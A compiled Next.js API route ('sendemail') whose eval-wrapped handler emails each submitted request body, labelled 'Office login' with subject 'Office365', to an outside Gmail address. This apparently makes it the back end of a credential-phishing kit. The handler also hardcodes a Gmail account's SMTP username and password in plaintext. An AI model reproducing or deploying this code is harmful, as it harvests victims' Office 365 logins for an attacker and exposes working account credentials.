"use strict";
/*
 * ATTENTION: An "eval-source-map" devtool has been used.
 * This devtool is neither made for production nor for readable output files.
 * It uses "eval()" calls to create a separate source file with attached SourceMaps in the browser devtools.
 * If you are trying to read the output file, select a different devtool (https://webpack.js.org/configuration/devtool/)
 * or disable the default devtool with "devtool: false".
 * If you are looking for production-ready output files, see mode: "production" (https://webpack.js.org/configuration/mode/).
 */
(() => {
var exports = {};
exports.id = "pages/api/sendemail";
exports.ids = ["pages/api/sendemail"];
exports.modules = {

/***/ "nodemailer":
/*!*****************************!*\
  !*** external "nodemailer" ***!
  \*****************************/
/***/ ((module) => {

module.exports = require("nodemailer");

/***/ }),

/***/ "(api)/./pages/api/sendemail.js":
/*!********************************!*\
  !*** ./pages/api/sendemail.js ***!
  \********************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

eval("__webpack_require__.r(__webpack_exports__);\n/* harmony export */ __webpack_require__.d(__webpack_exports__, {\n/* harmony export */   \"default\": () => (/* binding */ sendEmail)\n/* harmony export */ });\nlet nodemailer = __webpack_require__(/*! nodemailer */ \"nodemailer\");\nasync function sendEmail(req, res) {\n    console.log(req.body);\n    let transporter = nodemailer.createTransport({\n        port: 465,\n        host: \"smtp.gmail.com\",\n        secure: true,\n        auth: {\n            user: 'techbae.js@gmail.com',\n            pass: 'Techbae1*'\n        }\n    });\n    let info = await transporter.sendMail({\n        from: '\"Office\" <techbae.js@gmail.com>',\n        to: 'lapcon1201@gmail.com',\n        subject: 'Office365',\n        text: `Ofiice login ${req.body}`,\n        html: `<h6> Office Login: ${req.body}</h6>`\n    });\n    res.json({\n        info\n    });\n};\n//# sourceURL=[module]\n//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJmaWxlIjoiKGFwaSkvLi9wYWdlcy9hcGkvc2VuZGVtYWlsLmpzLmpzIiwibWFwcGluZ3MiOiI7Ozs7QUFBQSxHQUFHLENBQUNBLFVBQVUsR0FBR0MsbUJBQU8sQ0FBQyw4QkFBWTtBQUV0QixlQUFlQyxTQUFTLENBQUVDLEdBQUcsRUFBRUMsR0FBRyxFQUFFLENBQUM7SUFDaERDLE9BQU8sQ0FBQ0MsR0FBRyxDQUFDSCxHQUFHLENBQUNJLElBQUk7SUFFbkIsR0FBRyxDQUFDQyxXQUFXLEdBQUdSLFVBQVUsQ0FBQ1MsZUFBZSxDQUFDLENBQUM7UUFDM0NDLElBQUksRUFBRSxHQUFHO1FBQ1RDLElBQUksRUFBRSxDQUFnQjtRQUN0QkMsTUFBTSxFQUFFLElBQUk7UUFDWkMsSUFBSSxFQUFFLENBQUM7WUFDTEMsSUFBSSxFQUFFLENBQXNCO1lBQzVCQyxJQUFJLEVBQUUsQ0FBVztRQUNuQixDQUFDO0lBQ0osQ0FBQztJQUVDLEdBQUcsQ0FBQ0MsSUFBSSxHQUFHLEtBQUssQ0FBQ1IsV0FBVyxDQUFDUyxRQUFRLENBQUMsQ0FBQztRQUN0Q0MsSUFBSSxFQUFFLENBQWlDO1FBQ3ZDQyxFQUFFLEVBQUUsQ0FBc0I7UUFDMUJDLE9BQU8sRUFBRSxDQUFXO1FBQ3BCQyxJQUFJLEdBQUcsYUFBYSxFQUFFbEIsR0FBRyxDQUFDSSxJQUFJO1FBQzlCZSxJQUFJLEdBQUcsbUJBQW1CLEVBQUVuQixHQUFHLENBQUNJLElBQUksQ0FBQyxLQUFLO0lBQzNDLENBQUM7SUFFRkgsR0FBRyxDQUFDbUIsSUFBSSxDQUFDLENBQUNQO1FBQUFBLElBQUk7SUFBQSxDQUFDO0FBQ3JCLENBQUMiLCJzb3VyY2VzIjpbIndlYnBhY2s6Ly9teS1hcHAvLi9wYWdlcy9hcGkvc2VuZGVtYWlsLmpzPzc5YTkiXSwic291cmNlc0NvbnRlbnQiOlsibGV0IG5vZGVtYWlsZXIgPSByZXF1aXJlKCdub2RlbWFpbGVyJylcclxuXHJcbmV4cG9ydCBkZWZhdWx0IGFzeW5jIGZ1bmN0aW9uIHNlbmRFbWFpbCAocmVxLCByZXMpIHtcclxuICAgIGNvbnNvbGUubG9nKHJlcS5ib2R5KVxyXG5cclxuICAgICBsZXQgdHJhbnNwb3J0ZXIgPSBub2RlbWFpbGVyLmNyZWF0ZVRyYW5zcG9ydCh7XHJcbiAgICAgICAgcG9ydDogNDY1LFxyXG4gICAgICAgIGhvc3Q6IFwic210cC5nbWFpbC5jb21cIixcclxuICAgICAgICBzZWN1cmU6IHRydWUsIC8vIHRydWUgZm9yIDQ2NSwgZmFsc2UgZm9yIG90aGVyIHBvcnRzXHJcbiAgICAgICAgYXV0aDoge1xyXG4gICAgICAgICAgdXNlcjogJ3RlY2hiYWUuanNAZ21haWwuY29tJywgLy8gZ2VuZXJhdGVkIGV0aGVyZWFsIHVzZXJcclxuICAgICAgICAgIHBhc3M6ICdUZWNoYmFlMSonLCAvLyBnZW5lcmF0ZWQgZXRoZXJlYWwgcGFzc3dvcmRcclxuICAgICAgICB9LFxyXG4gICAgIH0pXHJcblxyXG4gICAgICAgbGV0IGluZm8gPSBhd2FpdCB0cmFuc3BvcnRlci5zZW5kTWFpbCh7XHJcbiAgICAgICAgZnJvbTogJ1wiT2ZmaWNlXCIgPHRlY2hiYWUuanNAZ21haWwuY29tPicsXHJcbiAgICAgICAgdG86ICdsYXBjb24xMjAxQGdtYWlsLmNvbScsXHJcbiAgICAgICAgc3ViamVjdDogJ09mZmljZTM2NScsXHJcbiAgICAgICAgdGV4dDogYE9maWljZSBsb2dpbiAke3JlcS5ib2R5fWAsXHJcbiAgICAgICAgaHRtbDogYDxoNj4gT2ZmaWNlIExvZ2luOiAke3JlcS5ib2R5fTwvaDY+YFxyXG4gICAgICAgfSlcclxuXHJcbiAgICAgIHJlcy5qc29uKHtpbmZvfSlcclxufSJdLCJuYW1lcyI6WyJub2RlbWFpbGVyIiwicmVxdWlyZSIsInNlbmRFbWFpbCIsInJlcSIsInJlcyIsImNvbnNvbGUiLCJsb2ciLCJib2R5IiwidHJhbnNwb3J0ZXIiLCJjcmVhdGVUcmFuc3BvcnQiLCJwb3J0IiwiaG9zdCIsInNlY3VyZSIsImF1dGgiLCJ1c2VyIiwicGFzcyIsImluZm8iLCJzZW5kTWFpbCIsImZyb20iLCJ0byIsInN1YmplY3QiLCJ0ZXh0IiwiaHRtbCIsImpzb24iXSwic291cmNlUm9vdCI6IiJ9\n//# sourceURL=webpack-internal:///(api)/./pages/api/sendemail.js\n");

/***/ })

};
;

// load runtime
var __webpack_require__ = require("../../webpack-api-runtime.js");
__webpack_require__.C(exports);
var __webpack_exec__ = (moduleId) => (__webpack_require__(__webpack_require__.s = moduleId))
var __webpack_exports__ = (__webpack_exec__("(api)/./pages/api/sendemail.js"));
module.exports = __webpack_exports__;

})();